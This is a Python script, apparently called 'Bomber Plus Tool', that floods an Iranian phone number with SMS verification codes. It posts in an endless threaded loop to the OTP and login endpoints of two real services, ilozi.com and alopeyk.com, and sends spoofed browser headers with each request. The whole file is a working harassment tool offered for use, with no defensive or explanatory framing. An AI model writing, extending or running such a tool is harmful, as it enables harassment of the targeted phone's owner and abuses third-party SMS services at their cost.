from threading import Thread
from time import sleep
import sys
import socket

try:
    from requests import get, post
except ImportError:
    import os
    os.system("python3 -m pip install requests")
    from requests import get, post

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
p = '\033[35;1m'
a = '\033[0m'

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("google.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS Services
# ------------------------------
def ilozi(phone):
    url = "https://ilozi.com/wp-json/digits/v1/send_otp"
    payload = {
        "digits_reg_mobile": "0"+phone.split("+98")[1],
        "digits_reg_countrycode": "98",
        "type": "register"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, */*; q=0.1",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://ilozi.com",
        "Referer": "https://ilozi.com/?login=true",
        "X-Requested-With": "XMLHttpRequest"
    }
    try:
        response = post(url, data=payload, headers=headers, timeout=5)
        if response.status_code == 200 and response.json().get("success") is True:
            print(f"{g}(ilozi){a} Code Sent")
            return True
        else:
            print(f"{r}[-] (ilozi) Failed or No Response{a}")
            return False
    except Exception as e:
        print(f"{r}[!] ilozi Exception: {e}{a}")
        return False

def alopeyk_safir(phone):
    url = "https://api.alopeyk.com/safir-service/api/v1/login"
    payload = {"phone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f"{g}(Alopeyk Safir){a} Code Sent")
            return True
        else:
            print(f"{r}[-] (Alopeyk Safir) Failed or No Response{a}")
            return False
    except Exception as e:
        print(f"{r}[!] Alopeyk Safir Exception: {e}{a}")
        return False

# ------------------------------
# SMS Bomber
# ------------------------------
def Vip(phone, delay_time):
    services = [ilozi, alopeyk_safir]  # اضافه کردن سرویس‌های جدید به راحتی
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Services: {y}{len(services)}")
    print_slow(f"{g}Delay: {y}{delay_time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=run_service, args=(service, phone)).start()
                sleep(delay_time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] Mission Completed!{a}")

def run_service(service, phone):
    """Wrapper for service to handle exceptions safely"""
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception: {e}{a}")

# ------------------------------
# Phone validation
# ------------------------------
from re import match, sub
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    print_slow("""
╔════════════════════════════════════════════════════╗
║             ⟬ Bomber Plus Tool ⟭                 ║
╚════════════════════════════════════════════════════╝
Choose an Option:
    [1] SMS Bomber
    [0] Exit
""")
    return input("Enter Choice: ")

def main():
    while True:
        choice = main_menu()
        if choice == "1":
            phone = input("Enter Phone (+98): ")
            phone = is_phone(phone)
            if not phone:
                print("Invalid Phone!")
                continue
            try:
                delay_time = float(input("Delay (seconds, default 0.1): ") or 0.1)
            except ValueError:
                delay_time = 0.1
            Vip(phone, delay_time)
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid Choice!")

if __name__ == "__main__":
    main()
